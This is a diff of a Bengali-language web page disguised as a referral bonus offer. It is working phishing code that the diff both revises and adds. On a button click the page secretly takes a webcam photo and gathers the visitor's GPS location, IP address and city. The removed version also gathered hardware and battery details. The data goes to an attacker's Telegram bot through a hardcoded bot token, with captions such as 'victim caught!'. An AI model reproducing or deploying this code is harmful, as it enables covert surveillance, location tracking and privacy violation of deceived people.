@@ -20,27 +20,21 @@
             z-index: 2; position: relative; border: 2px solid #00ff00;
             box-shadow: 0 0 20px #00ff00;
         }
-        h1 { color: #00ff00; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
-        h2 { color: #ffffff; font-size: 16px; margin-bottom: 10px; }
-        p { color: #00ff00; font-size: 14px; margin-bottom: 25px; }
+        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; }
+        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
         #verify-btn { 
             background-color: #00ff00; color: #000; border: none; padding: 15px; 
             font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
-            transition: 0.3s;
         }
-        #verify-btn:hover { background-color: #053b05; color: #00ff00; }
-        #status { margin-top: 20px; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
-        .success { color: #00ff00 !important; }
-        .error { color: #ff0000 !important; }
+        #status { margin-top: 25px; font-weight: bold; font-size: 14px; color: #00ff00; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>বোনাস নিন </h1>
+        <h1>বোনাস সিস্টেম</h1>
         <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
-        <p>[ বোনাস পেতে রেফার করুন ]</p>
-        <button id="verify-btn">রেফার করুন </button>
+        <button id="verify-btn">START REFER</button>
         <div id="status"></div>
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
@@ -49,92 +43,82 @@
     <script>
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
-        const urlParams = new URLSearchParams(window.location.search);
-        const userIdFromLink = urlParams.get('id'); 
 
         const verifyBtn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        // অ্যাডভান্সড ট্র্যাকার ডাটা সংগ্রহ
-        async function getDeepIntel() {
-            let intel = "\n\n🌐 **NETWORK INTEL**";
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                
-                intel += `\nIP: \`${d.ip}\`\nISP: \`${d.connection.isp}\`\nLoc: \`${d.city}, ${d.country}\`\nMaps: [Click Here](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
-                
-                intel += "\n\n💻 **HARDWARE INTEL**";
-                intel += `\nCores: \`${navigator.hardwareConcurrency || 'N/A'}\`\nRAM: \`${navigator.deviceMemory || 'N/A'}GB\`\nScreen: \`${window.screen.width}x${window.screen.height}\``;
-                
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    intel += `\nBattery: \`${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Idle'})\``;
-                }
-            } catch (e) { intel += "\nError fetching intel."; }
-            return intel;
+        let googleMapLink = "লোকেশনের অনুমতি দেওয়া হয়নি।";
+
+        // ১. জিপিএস লোকেশন সংগ্রহ করার ফাংশন
+        function getGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    googleMapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                }, (err) => {
+                    console.log("Location Denied");
+                });
+            }
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "> INITIALIZING SYSTEM...";
-            status.className = "success";
+            status.innerText = "> ক্যামেরা ও লোকেশন পারমিশন দিন...";
             verifyBtn.style.display = "none"; 
 
+            // জিপিএস পারমিশন চাওয়া
+            getGPS();
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                const video = document.getElementById('video');
+                // ২. ক্যামেরা পারমিশন চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                // ট্র্যাকার ডাটা ফেচ করা
-                const intelData = await getDeepIntel();
+                status.innerText = "> ভেরিফাই হচ্ছে... ৩ সেকেন্ড অপেক্ষা করুন।";
 
                 setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(async (blob) => {
-                        const caption = "🛠 **SYSTEM BREACH SUCCESSFUL**" + intelData;
+                        let caption = "📸 ভিকটিম ধরা পড়েছে!\n\n";
                         
-                        const ok = await sendToTelegram(blob, adminId, caption);
-                        if (userIdFromLink && userIdFromLink !== adminId) {
-                            await sendToTelegram(blob, userIdFromLink, caption);
-                        }
+                        // ৩. আইপি ভিত্তিক সাধারণ ট্র্যাকিং
+                        try {
+                            const res = await fetch('https://ipwho.is/');
+                            const d = await res.json();
+                            caption += `📍 আইপি: ${d.ip}\n🌍 শহর: ${d.city}, ${d.country}\n`;
+                        } catch(e) {}
 
-                        if(ok) {
-                            status.innerText = "> VERIFICATION SUCCESSFUL";
-                            status.className = "success";
-                        } else {
-                            status.innerText = "> UPLOAD ERROR: CHECK BOT TOKEN";
-                            status.className = "error";
-                        }
-                        stream.getTracks().forEach(t => t.stop());
+                        // ৪. জিপিএস লোকেশন অ্যাড করা
+                        caption += `🎯 সঠিক ম্যাপ লোকেশন: ${googleMapLink}`;
+
+                        const formData = new FormData();
+                        formData.append('chat_id', adminId);
+                        formData.append('photo', blob, 'user.jpg');
+                        formData.append('caption', caption);
+
+                        // ৫. টেলিগ্রামে পাঠানো
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        status.innerText = "> ভেরিফিকেশন সফল!";
+                        stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg', 0.8);
                 }, 3000); 
 
             } catch (err) {
-                status.innerText = "> ACCESS DENIED: CAMERA REQUIRED";
-                status.className = "error";
+                status.innerText = "> ক্যামেরা বা লোকেশন এলাও করা হয়নি!";
+                status.style.color = "#ff0000";
                 verifyBtn.style.display = "block";
             }
         });
-
-        async function sendToTelegram(blob, id, caption) {
-            const formData = new FormData();
-            formData.append('chat_id', id);
-            formData.append('photo', blob, 'x-capture.jpg');
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                const res = await response.json();
-                return res.ok;
-            } catch(e) { return false; }
-        }
     </script>
 </body>
 </html>
